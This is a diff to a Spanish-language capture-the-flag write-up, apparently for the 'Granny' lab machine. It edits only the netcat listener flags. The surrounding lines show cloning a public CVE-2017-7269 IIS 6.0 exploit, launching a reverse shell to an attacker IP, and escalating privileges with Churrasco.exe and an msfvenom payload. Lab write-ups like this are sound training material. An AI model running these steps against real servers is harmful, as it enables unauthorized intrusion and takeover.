@@ -83,7 +83,7 @@ Lo impor tante es microsoft-IIS 6.0
 ---------
 # [[CVE-2017-7269]]
 
-Con [[git clone]] usamos el comando `git clone https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269` para descargar el repositorio, despues con [[cd]] usamos `cd iis6-exploit-2017-CVE-2017-7269` y luego con ``python2.7 iis6\ reverse\ shell 10.10.10.15 80 10.10.16.15 443`` vamos a mandarnos la [[Reverse shell]] mientras estamos en escucha con [[rlwrap nc -lvnp 443]]
+Con [[git clone]] usamos el comando `git clone https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269` para descargar el repositorio, despues con [[cd]] usamos `cd iis6-exploit-2017-CVE-2017-7269` y luego con ``python2.7 iis6\ reverse\ shell 10.10.10.15 80 10.10.16.15 443`` vamos a mandarnos la [[Reverse shell]] mientras estamos en escucha con [[rlwrap -cAr nc -lvnp 443]]
 
 
 ![[Granny6.png]]
@@ -121,7 +121,7 @@ Y desde la maquina victima vamos a descargar los archivos con `copy \\10.10.16.1
 Ejecutamos el [[Churrasco.exe]] pasandole el *exploit.exe* que creamos para enviarnos una [[Reverse shell]] con [[msfvenom]]
 
 ![[Granny14.png]]
-Mientras estamos en escucha con [[rlwrap nc -lvnp 443]] con el comando `rlwrap nc -nlvp 500` para enviarnos una [[Reverse shell]]
+Mientras estamos en escucha con [[rlwrap -cAr nc -lvnp 443]] con el comando `rlwrap nc -nlvp 500` para enviarnos una [[Reverse shell]]
 ![[Granny12.png]]
 Ya elevamos nuestro privilegio al maximo y podemos ver las flags
 
